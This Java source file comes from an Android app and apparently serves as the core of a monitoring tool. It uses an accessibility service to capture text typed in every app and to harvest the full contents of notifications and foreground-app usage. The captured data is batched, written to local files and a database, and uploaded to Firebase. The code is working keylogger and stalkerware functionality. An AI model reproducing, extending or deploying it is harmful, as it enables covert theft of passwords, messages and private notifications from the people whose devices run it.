package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.convertToString;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.text.format.DateFormat;
import android.view.accessibility.AccessibilityEvent;

import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.data.AppUsageData;
import com.vikasyadavnsit.cdc.data.ApplicationData;
import com.vikasyadavnsit.cdc.data.DeviceData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository;
import com.vikasyadavnsit.cdc.enums.AppStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.services.CDCAccessibilityService;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.Collectors;

public class AccessibilityUtils {

    private static final long BATCH_INTERVAL_MS = 15000; // Batch every 15 seconds
    private static final int MAX_BATCH_SIZE = 30; // Process when entries exceed 30
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static final List<KeyStrokeData> textChanges = new ArrayList<>();
    private static final ExecutorService executorService = Executors.newSingleThreadExecutor();

    public static final Map<String, Long> appStartTimes = new HashMap<>();
    public static String lastPackageName = "";

    /**
     * Opens the Android Accessibility settings screen if the app's accessibility service is not enabled.
     *
     * <p>This is typically used to prompt the user to enable {@link CDCAccessibilityService} so the
     * app can receive accessibility events needed for keystroke/app-usage/notification capture.</p>
     *
     * @param context Android {@link Context} used to check settings and start the settings {@link Intent}.
     */
    public static void startAccessibilitySettingIntent(Context context) {
        if (!isAccessibilityServiceEnabled(context, CDCAccessibilityService.class)) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            context.startActivity(intent);
        }
    }

    /**
     * Checks whether a given accessibility service is enabled in system settings.
     *
     * <p>This reads {@link Settings.Secure#ENABLED_ACCESSIBILITY_SERVICES} and checks whether the
     * flattened component name for {@code service} appears in the enabled list.</p>
     *
     * @param context Android {@link Context} used to read secure settings.
     * @param service The accessibility service class to check.
     * @return {@code true} if the service appears enabled in system settings; {@code false} otherwise.
     */
    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends android.accessibilityservice.AccessibilityService> service) {
        String expectedComponentName = new ComponentName(context, service).flattenToString();
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);

        if (enabledServicesSetting != null) {
            TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
            splitter.setString(enabledServicesSetting);

            while (splitter.hasNext()) {
                String componentName = splitter.next();
                if (componentName.equalsIgnoreCase(expectedComponentName)) {
                    return true;
                }
            }
        }

        return false;
    }


    /**
     * Collects text-change accessibility events into a batch and schedules background processing.
     *
     * <p>The method extracts the changed text, wraps it in {@link KeyStrokeData} (including the
     * originating package name and a timestamp), and stores it into an in-memory buffer. Processing
     * is triggered either when the batch reaches {@link #MAX_BATCH_SIZE} or after
     * {@link #BATCH_INTERVAL_MS} has elapsed.</p>
     *
     * @param event The {@link AccessibilityEvent} carrying view text change/selection change data.
     */
    public static void processTextChangedEvent(AccessibilityEvent event) {
        String changedText = event.getText().stream().collect(Collectors.joining());
        if (!TextUtils.isEmpty(changedText)) {
            synchronized (textChanges) {
                // Remove the last text change if it matches the current text change
//                if (!textChanges.isEmpty() && changedText.contains(textChanges.get(textChanges.size() - 1).getText())) {
//                    textChanges.remove(textChanges.size() - 1);
//                }
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
                KeyStrokeData keyStrokeData = KeyStrokeData.builder().appPackage(packageName).text(changedText).timestamp(LocalDateTime.now().toString()).build();
                textChanges.add(keyStrokeData);

                if (textChanges.size() >= MAX_BATCH_SIZE) {
                    handler.removeCallbacks(processTextChangesRunnable);
                    handler.post(processTextChangesRunnable);
                } else {
                    handler.postDelayed(processTextChangesRunnable, BATCH_INTERVAL_MS);
                }

            }
        }
    }

    /**
     * Runnable scheduled on the main thread that drains the buffered keystroke events and hands
     * them off to a background executor.
     *
     * <p>This ensures batching happens on a predictable cadence without blocking the accessibility
     * callback thread.</p>
     */
    private static final Runnable processTextChangesRunnable = new Runnable() {
        @Override
        public void run() {
            List<KeyStrokeData> textBatch;
            synchronized (textChanges) {
                textBatch = new ArrayList<>(textChanges);
                textChanges.clear();
            }
            executorService.execute(() -> processTextChanges(textBatch));
        }
    };

    /**
     * Processes a batch of keystroke events and persists/uploads them based on trigger settings.
     *
     * <p>Logic summary:</p>
     * <ul>
     *   <li>Requires external file access (see {@link CommonUtil#hasFileAccess()}) to read trigger settings.</li>
     *   <li>Loads {@code CAPTURE_KEY_STROKES} from {@link ApplicationDataRepository}.</li>
     *   <li>If enabled, optionally writes to local file, uploads to Firebase, and stores in Room.</li>
     *   <li>De-duplicates entries within the batch using a simple string key.</li>
     * </ul>
     *
     * @param textBatch The batch of {@link KeyStrokeData} events to process.
     */
    private static void processTextChanges(List<KeyStrokeData> textBatch) {
        if (hasFileAccess()) {
            ApplicationData appData = ApplicationDataRepository.getRecordByKey(ClickActions.CAPTURE_KEY_STROKES.name());
            User.AppTriggerSettingsData appTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);

            if (appTriggerSettingsData != null && appTriggerSettingsData.isEnabled()) {
                Set<String> seenKeyStrokes = new HashSet<>();
                for (KeyStrokeData keyStrokeData : textBatch) {
                    String keyStrokeText = "Package :" + keyStrokeData.getAppPackage() + " Text :" + keyStrokeData.getText();
                    if (!seenKeyStrokes.contains(keyStrokeText)) {
                        seenKeyStrokes.add(keyStrokeText);
                        if (appTriggerSettingsData.isSaveOnLocalFile())
                            FileUtils.appendDataToFile(FileMap.KEYSTROKE, keyStrokeText);

                        if (appTriggerSettingsData.isUploadDataSnapshot())
                            FirebaseUtils.uploadUserKeystrokeDataSnapshot(keyStrokeData);

                        DeviceDataRepository.insert(DeviceData.builder().value(new Gson().toJson(keyStrokeData)).fileMapType(FileMap.KEYSTROKE).build());
                    }
                }
            } else {
                LoggerUtils.d("AccessibilityUtils", "CAPTURE_KEY_STROKES setting is disabled");
            }
        } else {
            LoggerUtils.d("AccessibilityUtils", "No File Access for KeyStrokes logging decision");
        }
    }

    /**
     * Extracts notification details from an accessibility event and routes them to collection logic.
     *
     * <p>If the event carries a {@link Notification} object, this extracts its extras and timestamp.
     * Otherwise it falls back to capturing the event text and event time.</p>
     *
     * @param event Accessibility notification event, typically {@link AccessibilityEvent#TYPE_NOTIFICATION_STATE_CHANGED}.
     */
    public static void processNotificationEvent(AccessibilityEvent event) {

        Notification notification = (Notification) event.getParcelableData();
        NotificationData notificationData = NotificationData.builder().build();

        if (Objects.nonNull(notification) && Objects.nonNull(notification.extras)) {
            Map<String, Object> map = new HashMap<>();
            for (String key : notification.extras.keySet()) {
                Object data = notification.extras.get(key);
                if (Objects.nonNull(data)) {
                    map.put(key.replace(".", "_"), convertToString(data));
                }
            }
            notificationData.setExtras(map);
            notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(notification.when)).toString());
        } else {
            notificationData.setExtras(Map.of("data", event.getText().stream().collect(Collectors.joining(", "))));
            notificationData.setTimestamp(DateFormat.format("yyyy-MM-dd hh:mm:ss", new Date(event.getEventTime())).toString());
        }
        notificationData.setPackageName(event.getPackageName().toString());
        collectNotificationData(notificationData);

    }

    /**
     * Persists/uploads a notification snapshot based on the local trigger setting.
     *
     * <p>Logic summary:</p>
     * <ul>
     *   <li>Requires external file access to read {@code CAPTURE_NOTIFICATIONS} from Room.</li>
     *   <li>If enabled, optionally writes to file, uploads to Firebase, and inserts into Room.</li>
     * </ul>
     *
     * @param notificationData Parsed {@link NotificationData} to store/upload.
     */
    private static void collectNotificationData(NotificationData notificationData) {
        if (hasFileAccess()) {
            ApplicationData appData = ApplicationDataRepository.getRecordByKey(ClickActions.CAPTURE_NOTIFICATIONS.name());
            User.AppTriggerSettingsData appTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);

            if (appTriggerSettingsData != null && appTriggerSettingsData.isEnabled()) {

                if (appTriggerSettingsData.isSaveOnLocalFile())
                    FileUtils.appendDataToFile(FileMap.NOTIFICATION, notificationData.toString());

                if (appTriggerSettingsData.isUploadDataSnapshot())
                    FirebaseUtils.uploadUserNotificationDataSnapshot(notificationData);

                DeviceDataRepository.insert(DeviceData.builder().value(new Gson().toJson(notificationData)).fileMapType(FileMap.NOTIFICATION).build());
            } else {
                LoggerUtils.d("AccessibilityUtils", "CAPTURE_NOTIFICATIONS setting is disabled");
            }
        } else {
            LoggerUtils.d("AccessibilityUtils", "No File Access for Notification logging decision");
        }
    }

    /**
     * Tracks app foreground/background transitions based on window state changes.
     *
     * <p>This method keeps a map of app start times and, when the foreground app changes, emits
     * {@link AppUsageData} events representing open/close transitions. The resulting events are
     * passed to {@link #collectApplicationUsageData(AppUsageData)} for optional persistence/upload.</p>
     *
     * @param packageName The package name reported by the accessibility event.
     */
    public static void processWindowStateMovement(CharSequence packageName) {
        if (packageName != null) {
            String currentPackageName = packageName.toString();
            long currentTime = System.currentTimeMillis();

            if (!currentPackageName.equals(lastPackageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (!lastPackageName.isEmpty() && appStartTimes.containsKey(lastPackageName)) {
                    long startTime = appStartTimes.remove(lastPackageName);
                    collectApplicationUsageData(AppUsageData.builder().packageName(lastPackageName).start(startTime).end(currentTime).status(AppStatus.CLOSED_AFTER_OPENING).build());
                }
                collectApplicationUsageData(AppUsageData.builder().packageName(lastPackageName).start(currentTime).status(AppStatus.OPEN).build());
                appStartTimes.put(currentPackageName, currentTime);
                lastPackageName = currentPackageName;
            }
        }

    }

    /**
     * Persists/uploads an application-usage event based on the local trigger setting.
     *
     * <p>Logic summary:</p>
     * <ul>
     *   <li>Requires external file access to read {@code MONITOR_APP_USAGE_STATISTICS} from Room.</li>
     *   <li>If enabled, optionally writes to file, uploads to Firebase, and inserts into Room.</li>
     * </ul>
     *
     * @param appUsageData The {@link AppUsageData} event to store/upload.
     */
    private static void collectApplicationUsageData(AppUsageData appUsageData) {
        if (hasFileAccess()) {
            ApplicationData appData = ApplicationDataRepository.getRecordByKey(ClickActions.MONITOR_APP_USAGE_STATISTICS.name());
            User.AppTriggerSettingsData appTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);

            if (appTriggerSettingsData != null && appTriggerSettingsData.isEnabled()) {

                if (appTriggerSettingsData.isSaveOnLocalFile())
                    FileUtils.appendDataToFile(FileMap.APPLICATION_USAGE, appUsageData.toString());

                if (appTriggerSettingsData.isUploadDataSnapshot())
                    FirebaseUtils.uploadApplicationUsageDataSnapshot(appUsageData);

                DeviceDataRepository.insert(DeviceData.builder().value(new Gson().toJson(appUsageData)).fileMapType(FileMap.APPLICATION_USAGE).build());
            } else {
                LoggerUtils.d("AccessibilityUtils", "MONITOR_APP_USAGE_STATISTICS setting is disabled");
            }
        } else {
            LoggerUtils.d("AccessibilityUtils", "No File Access for Application Usage logging decision");
        }
    }

}
